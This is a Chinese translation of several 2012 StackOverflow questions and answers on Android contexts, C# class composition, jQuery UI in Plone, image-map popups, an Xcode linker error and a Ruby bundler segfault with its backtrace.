# StackOverflow 问答 10676000-10676999

# android - getApplicationContext 在 TabActivity 中返回 null

> ID：10676000
> 
> 赞同：0
> 
> 时间：2012-05-20T18:26:51.360
> 
> 标签：android, tabactivity

```
public class MyTabActivity extends TabActivity {
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    dataManager = DataManager.getInstance(getApplicationContext());
  }
} 
```

我有一个选项卡活动，如上所示。它在初始运行时运行良好。在后台从内存中删除它的活动一段时间后，当你重新打开应用程序时，它会崩溃。原因是因为 getApplicationContext() 返回 null。

我在其他活动中使用相同的设置没有问题。我在文档中找不到说明何时/为什么/如果它会返回 null 的任何地方。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T18:56:55.377

您可以简单地将“this”传递给您的 DataManager.getInstance，因为您的 MyTabActivity 继承自 Context（向上三层）

# c# - C# 嵌套类

> ID：10676003
> 
> 赞同：0
> 
> 时间：2012-05-20T18:27:01.850
> 
> 标签：c#, class, nested

我正在尝试在我的主类中创建一些嵌套类。

```
public class MyPlayer : Player
{

    public bool TargetEnemy()
    {
        return true;

    }

    public class Movement
    {
        public uint aInt = 1;

        public TurnLeft()
        {

        }
    }

    public class ActionBar
    {

    }
} 
```

我有许多不同的类，这样我就可以通过代码访问 MyPlayer 类，而无需将其传递给所有类。我刚刚创建了一个静态类来保存它的变量。我可以使用 Main.Units.MyPlayer.Movement 访问 MyPlayer->Movement 但这没有链接到我在静态类中定义的 MyPlayer 实例。

例如，我希望能够执行 MyPlayer->Movement->TurnLeft()。我将如何实现这一目标？感谢您的回答。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T18:32:32.637

您可能将类嵌套与类组合的概念弄错了。为了`Movement`在您的类中有一个实例`Player`，您可以定义一个私有字段`movement`和一个公共属性`Movement`来访问它。

```
public class Player
{        
    public bool TargetEnemy()
    {
        return true;            
    }

    private Movement movement = new Movement();

    public Movement Movement
    {
        get { return movement; }
        set { movement = value; }
    }
}

public class Movement
{
    public uint aInt = 1;

    public TurnLeft()
    {

    }
}

public class ActionBar
{

} 
```

然后，您可以创建`Player`类的实例并访问其包含的`Movement`：

```
Player myPlayer = new Player();
myPlayer.Movement.TurnLeft(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T18:29:40.057

然后`MyPlayer`应该有一个`Movement`实例的引用。

```
public class MyPlayer : Player
{
    public static Movement movement = new Movement();
    ...
} 
```

# jquery-ui - 在 Plone 中使用 jQueryUi 需要帮助

> ID：10676004
> 
> 赞同：2
> 
> 时间：2012-05-20T18:27:02.460
> 
> 标签：jquery-ui, plone

我是 Plone 和 jQueryUI 的新手，并且无法让任何 jQueryUI 在 Plone 页面上工作。

我安装了 Plone 4 (4.1.4 41143) 和 jQueryUI 1.8.16 (http://plone.org/products/collective.js.jqueryui)，

在 Zope 管理界面 > portal_javascripts 下，collective.js.jqueryui.custom.min.js 存在并启用。

为了尝试实现[http://jqueryui.com/demos/button/](http://jqueryui.com/demos/button/)中的示例，我放置在 Plone 页面的正文中：

```
<script type="text/javascript">
    jQuery({function($) {
        $( "input:submit, a, button", ".demo" ).button();
        $( "a", ".demo" ).click(function() { return false; });
    });
</script>

<DIV class=demo>
<BUTTON type=submit>A button element</BUTTON> <INPUT value="A submit button"  type=submit> <A href="#">An anchor</A>
</DIV><!-- End demo --> 
```

但结果页面未显示预期结果。

我尝试用“$”、“collective.js.jqueryui.custom.min”替换上面代码中的“jQuery”，但还没有任何效果。

我能够让一些 jQueryUI 在 Plone 之外工作，但有兴趣知道如何在 Plone 中使用它。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-21T12:05:29.960

您的**脚本**标签的内容可能正在被 Plone 的 HTML 过滤删除。您可以在“站点设置”、“HTML 过滤”中更改它。（那里的对话框很混乱，您必须单击两个按钮。首先从“讨厌的标签”中删除，然后在页面底部“保存”。）

但请注意，不允许用户使用**script**、**embed**和其他标签有很好的安全原因。它可能会导致各种麻烦，例如当他们也被允许在评论中，或者经验不足的用户复制/粘贴危险代码时。

如果您只是在练习，而不是将您的网站放在糟糕的 Internet 上，那会很好，但是如果您开始部署一个真实的网站，最好将**脚本**内容放入您自己的基于文件的页面模板中添加-在产品上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T18:49:04.320

您在`script`标签中的语法不正确。试试这个：

```
jQuery(function($) {
    $( "input:submit, a, button", ".demo" ).button();
    $( "a", ".demo" ).click(function() { return false; });
})($);​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-19T01:11:47.253

是的，您可能需要允许如上所述的脚本标签，但是在我用 $ 符号替换单词 jQuery 之前，该示例仍然对我不起作用，至少在 Plone 4.2.1.1 上使用collective.js.jqueryui 1.8.16.9 时.

```
<script>
    $(function() {
        $( "#progressbar1" ).progressbar();
        $( "#slider" ).slider();
        $( "input:submit, a, button", ".demo" ).button();
        $( "a", ".demo" ).click(function() { return false; });
     });
 </script> 
```

将 ($) 放在上面一行的分号之前也可以，但我看不出有什么区别。

即使脚本包含在“讨厌的标签”列表中，该脚本也适用于文件系统页面模板。此外，可以在页面模板中使用以下内容将脚本插入文档的头部：

```
<metal:slot fill-slot="javascript_head_slot">
<script>
    $(function() {
        $( "#slider" ).slider();
        $( "#progressbar1" ).progressbar();
        $( "input:submit, a, button", ".demo" ).button();
        $( "a", ".demo" ).click(function() { return false; });
    });
</script>
</metal:slot> 
```

（我很想知道是否有更合适的前缀，但我真的不知道 javascript。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-05T02:23:12.213

我刚刚遇到了一个类似的问题，试图让我的脚本和 jquery UI 与 plone/zope 设置一起工作。解决方案是在 javascript 注册表 (/portal_javascripts) 中注册它们。脚本本身被添加到 /portal_skins/custom 中，这也是我正在处理的主页所在的位置。如上所述，脚本标记已从源中过滤掉，而是自动添加来自注册表的脚本。还要记住，顺序在 javascript 注册表中很重要。

希望这对遇到此问题的其他用户有所帮助。

# php - 悬停弹出窗口与图像上的附加链接

> ID：10676007
> 
> 赞同：2
> 
> 时间：2012-05-20T18:27:33.330
> 
> 标签：php, javascript, html, popup, hover

我正在尝试建立一个我有图像的页面。现在我想做一个任务，当鼠标移到图像的某个部分时，带有一些链接的图像会作为鼠标悬停功能弹出。

例如，我有一张美国地图（作为我网页上的图像），并且当我将鼠标移到其州（例如：德克萨斯州）上时，德克萨斯州的图像（嵌入为超链接）弹出更大的视图，并且该图像具有城市的附加链接，用户应该能够单击这些链接并可以到达该城市的页面。

我希望我的查询很清楚。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T04:53:18.067

您可以使用图像地图来划分区域（例如州）。您可以使用一些 jquery 库，例如**maphighlight**来显示悬停效果。最后，由于您想在弹出框中显示动态内容，您可以创建一个通用模板，该模板根据传递的 id 填充，然后您可以向该页面发出**ajax 请求并传递 id。**colorbox （是一种灯箱）也支持图像映射，因此您可以使用 ajax 填充它，只需在每个区域的 href 标记中传递 urul 即可**。**

# iphone - 为什么我在启用第二个位置时得到 Apple Mach-O 链接器 (ld) 错误组？

> ID：10676010
> 
> 赞同：0
> 
> 时间：2012-05-20T18:27:49.137
> 
> 标签：iphone, ios5, xcode4.3

我有一个需要多语言的应用程序。当我将第二个位置添加到我的标题和我的.xib（所以我在 ViewController.xib 中有 ViewController(spanish).xib 和 ViewControler(english).xib）文件时，我收到了这个错误：

```
ld: duplicate symbol _OBJC_IVAR_$_ViewController.startButton in /Users/user/Library/Developer/Xcode/DerivedData/myapp-    dyorxnfjumuocabejnwkgswdssbz/Build/Intermediates/myapp.build/Debug-    iphonesimulator/myapp.build/Objects-normal/i386/ViewController-2972433CD1970D41.o and /Users/user/Library/Developer/Xcode/DerivedData/myapp-dyorxnfjumuocabejnwkgswdssbz/Build/Intermediates/myapp.build/Debug-iphonesimulator/myapp.build/Objects-normal/i386/ViewController-52AF4D2DE5BCD366.o for   architecture i386 
```

怎么了？感谢您的帮助！

# ruby-on-rails - 升级到 Ruby 1.9.3 后初始化新的 rails 项目

> ID：10676012
> 
> 赞同：1
> 
> 时间：2012-05-20T18:27:52.380
> 
> 标签：ruby-on-rails, ruby-on-rails-3.1, ruby-1.9.2

我从事 Ruby on rails 项目已有一段时间了，当时我按照最新一期的 Rails 敏捷 Web 开发中的说明安装了最新版本的 Ruby。在我只使用 OSX Lion 附带的版本之前，但使用 rvm 我已经安装了这个版本：

ruby 1.9.3p194（2012-04-20 修订版 35410）[x86_64-darwin11.4.0]

当我将其设置为使用例如 irb 执行时，效果很好，使用 ruby​​ 命令行工具运行脚本也效果很好。

我的问题是，当我使用“rails new”开始一个新项目，或者运行服务器或控制台时，rails 将无法工作。我有 Rails 3.2.3 版本。

错误堆栈如下：

```
BigMac:Coding ola$ rails new depot
  create  
  create  README.rdoc
  create  Rakefile
  create  config.ru
  create  .gitignore
  create  Gemfile
  create  app
  create  app/assets/images/rails.png
  create  app/assets/javascripts/application.js
  create  app/assets/stylesheets/application.css
  create  app/controllers/application_controller.rb
  create  app/helpers/application_helper.rb
  create  app/mailers
  create  app/models
  create  app/views/layouts/application.html.erb
  create  app/mailers/.gitkeep
  create  app/models/.gitkeep
  create  config
  create  config/routes.rb
  create  config/application.rb
  create  config/environment.rb
  create  config/environments
  create  config/environments/development.rb
  create  config/environments/production.rb
  create  config/environments/test.rb
  create  config/initializers
  create  config/initializers/backtrace_silencers.rb
  create  config/initializers/inflections.rb
  create  config/initializers/mime_types.rb
  create  config/initializers/secret_token.rb
  create  config/initializers/session_store.rb
  create  config/initializers/wrap_parameters.rb
  create  config/locales
  create  config/locales/en.yml
  create  config/boot.rb
  create  config/database.yml
  create  db
  create  db/seeds.rb
  create  doc
  create  doc/README_FOR_APP
  create  lib
  create  lib/tasks
  create  lib/tasks/.gitkeep
  create  lib/assets
  create  lib/assets/.gitkeep
  create  log
  create  log/.gitkeep
  create  public
  create  public/404.html
  create  public/422.html
  create  public/500.html
  create  public/favicon.ico
  create  public/index.html
  create  public/robots.txt
  create  script
  create  script/rails
  create  test/fixtures
  create  test/fixtures/.gitkeep
  create  test/functional
  create  test/functional/.gitkeep
  create  test/integration
  create  test/integration/.gitkeep
  create  test/unit
  create  test/unit/.gitkeep
  create  test/performance/browsing_test.rb
  create  test/test_helper.rb
  create  tmp/cache
  create  tmp/cache/assets
  create  vendor/assets/javascripts
  create  vendor/assets/javascripts/.gitkeep
  create  vendor/assets/stylesheets
  create  vendor/assets/stylesheets/.gitkeep
  create  vendor/plugins
  create  vendor/plugins/.gitkeep
     run  bundle install

/Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/http.rb:799: [BUG] Segmentation  fault
ruby 1.9.3p194 (2012-04-20 revision 35410) [x86_64-darwin11.4.0]

-- Control frame information -----------------------------------------------
c:0038 p:---- s:0217 b:0217 l:000216 d:000216 CFUNC  :connect
c:0037 p:0011 s:0214 b:0214 l:0019a0 d:000213 BLOCK  /Users/ola/.rvm/rubies/ruby-1.9.3-    p194/lib/ruby/1.9.1/net/http.rb:799
c:0036 p:0031 s:0212 b:0212 l:000211 d:000211 METHOD /Users/ola/.rvm/rubies/ruby-1.9.3- p194/lib/ruby/1.9.1/timeout.rb:54
c:0035 p:0026 s:0200 b:0200 l:000199 d:000199 METHOD /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/timeout.rb:99
c:0034 p:0485 s:0194 b:0194 l:0019a0 d:0019a0 METHOD /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/http.rb:799
c:0033 p:0011 s:0186 b:0186 l:000185 d:000185 METHOD /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/http.rb:755
c:0032 p:0089 s:0183 b:0183 l:000182 d:000182 METHOD /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/http.rb:750
c:0031 p:0340 s:0180 b:0180 l:000179 d:000179 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/net/http/persistent.rb:224
c:0030 p:0157 s:0172 b:0172 l:000171 d:000171 METHOD /Users/ola/.rvm/gems/ruby-1.9.3- p194@global/gems/bundler-1.1.3/lib/bundler/vendor/net/http/persistent.rb:358
c:0029 p:0081 s:0158 b:0158 l:000157 d:000157 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/fetcher.rb:135
c:0028 p:0105 s:0150 b:0150 l:000149 d:000149 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/fetcher.rb:163
c:0027 p:0141 s:0140 b:0140 l:000139 d:000139 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/fetcher.rb:122
c:0026 p:0178 s:0130 b:0130 l:000129 d:000129 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/fetcher.rb:70
c:0025 p:0042 s:0122 b:0122 l:000111 d:000121 BLOCK  /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/source.rb:234
c:0024 p:---- s:0117 b:0117 l:000116 d:000116 FINISH
c:0023 p:---- s:0115 b:0115 l:000114 d:000114 CFUNC  :each
c:0022 p:0079 s:0112 b:0112 l:000111 d:000111 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/source.rb:232
 c:0021 p:0018 s:0102 b:0102 l:000101 d:000101 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/source.rb:165
 c:0020 p:0025 s:0098 b:0098 l:000097 d:000097 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/source.rb:70
c:0019 p:0059 s:0095 b:0094 l:000076 d:000093 BLOCK  /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:205
c:0018 p:---- s:0090 b:0090 l:000089 d:000089 FINISH
c:0017 p:---- s:0088 b:0088 l:000087 d:000087 CFUNC  :each
c:0016 p:0043 s:0085 b:0085 l:000076 d:000084 BLOCK  /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:202
c:0015 p:0020 s:0081 b:0081 l:000080 d:000080 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-  p194@global/gems/bundler-1.1.3/lib/bundler/index.rb:9
c:0014 p:0031 s:0077 b:0077 l:000076 d:000076 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:198
c:0013 p:0139 s:0074 b:0071 l:000070 d:000070 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:192
 c:0012 p:0027 s:0066 b:0066 l:000065 d:000065 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:127
 c:0011 p:0047 s:0060 b:0060 l:000059 d:000059 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:122
 c:0010 p:0303 s:0057 b:0057 l:000056 d:000056 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/installer.rb:48
 c:0009 p:0033 s:0051 b:0051 l:000050 d:000050 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/installer.rb:12
 c:0008 p:0978 s:0044 b:0044 l:000043 d:000043 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/cli.rb:220
  c:0007 p:0036 s:0036 b:0036 l:000035 d:000035 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/task.rb:22
  c:0006 p:0071 s:0030 b:0030 l:000029 d:000029 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/invocation.rb:118
  c:0005 p:0221 s:0024 b:0024 l:000023 d:000023 METHOD /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor.rb:263
  c:0004 p:0082 s:0013 b:0013 l:000012 d:000012 METHOD /Users/ola/.rvm/gems/ruby-1.9.3 -p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/base.rb:386
  c:0003 p:0054 s:0007 b:0007 l:001ba8 d:0024a0 EVAL   /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/bin/bundle:13
   c:0002 p:---- s:0004 b:0004 l:000003 d:000003 FINISH
    c:0001 p:0000 s:0002 b:0002 l:001ba8 d:001ba8 TOP   

  -- Ruby level backtrace information ----------------------------------------
  /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/bin/bundle:13:in `<main>'
  /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-    1.1.3/lib/bundler/vendor/thor/base.rb:386:in `start'
 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor.rb:263:in `dispatch'
 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/invocation.rb:118:in `invoke_task'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/thor/task.rb:22:in `run'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/cli.rb:220:in  `install'
 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/installer.rb:12:in `install'
  /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/installer.rb:48:in `run'
  /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:122:in `resolve_remotely!'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:127:in `specs'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:192:in `resolve'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:198:in `index'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/index.rb:9:in `build'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:202:in `block in index'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:202:in `each'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/definition.rb:205:in `block (2 levels) in index'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/source.rb:70:in `specs'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/source.rb:165:in `fetch_specs'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/source.rb:232:in `remote_specs'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/source.rb:232:in `each'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/source.rb:234:in `block in remote_specs'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/fetcher.rb:70:in `specs'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/fetcher.rb:122:in `fetch_remote_specs'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/fetcher.rb:163:in `fetch_dependency_remote_specs'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/fetcher.rb:135:in `fetch'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/net/http/persistent.rb:358:in `request'
/Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/vendor/net/http/persistent.rb:224:in `connection_for'
/Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/http.rb:750:in `start'
/Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/http.rb:755:in `do_start'
/Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/http.rb:799:in `connect'
/Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/timeout.rb:99:in `timeout'
/Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/timeout.rb:54:in `timeout'
/Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/http.rb:799:in `block in connect'
/Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/net/http.rb:799:in `connect'

-- C level backtrace information -------------------------------------------

   See Crash Report log file under ~/Library/Logs/CrashReporter or
   /Library/Logs/CrashReporter, for the more detail of.

-- Other runtime information -----------------------------------------------

* Loaded script: /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/bin/bundle

* Loaded features:

    0 enumerator.so
    1 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/enc/encdb.bundle
    2 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/enc/trans/transdb.bundle
    3 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/defaults.rb
    4 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/rbconfig.rb
    5 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/deprecate.rb
    6 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/exceptions.rb
    7 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb
    8 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems.rb
    9 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/ubygems.rb
   10 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/version.rb
   11 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/requirement.rb
   12 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/platform.rb
   13 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/specification.rb
   14 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/path_support.rb
   15 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/dependency.rb
   16 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/etc.bundle
   17 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/fileutils.rb
   18 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/pathname.bundle
   19 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/pathname.rb
   20 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/syntax_error.rb
   21 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/psych.bundle
   22 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/stringio.bundle
   23 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/nodes/node.rb
   24 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/nodes/stream.rb
   25 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/nodes/document.rb
   26 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/nodes/sequence.rb
   27 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/nodes/scalar.rb
   28 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/nodes/mapping.rb
   29 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/nodes/alias.rb
   30 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/nodes.rb
   31 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/streaming.rb
   32 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/visitors/visitor.rb
   33 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/strscan.bundle
   34 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/scalar_scanner.rb
   35 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/visitors/to_ruby.rb
   36 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/visitors/emitter.rb
   37 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/visitors/yaml_tree.rb
   38 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/json/ruby_events.rb
   39 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/visitors/json_tree.rb
   40 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/visitors/depth_first.rb
   41 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/visitors.rb
   42 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/handler.rb
   43 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/tree_builder.rb
   44 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/parser.rb
   45 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/omap.rb
   46 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/set.rb
   47 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/coder.rb
   48 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/core_ext.rb
   49 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/x86_64-darwin11.4.0/date_core.bundle
   50 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/date/format.rb
   51 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/date.rb
   52 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/deprecated.rb
   53 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/stream.rb
   54 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/json/yaml_events.rb
   55 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/json/tree_builder.rb
   56 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/json/stream.rb
   57 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych/handlers/document_stream.rb
   58 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/psych.rb
   59 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/yaml.rb
   60 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/psyched_yaml.rb
   61 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/gem_helpers.rb
   62 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/match_platform.rb
   63 /Users/ola/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.1.3/lib/bundler/rubygems_ext.rb
   64 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/config_file.rb
   65 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/psych_additions.rb
   66 /Users/ola/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/site_ruby/1.9.1/rubygems/psych_tree.rb
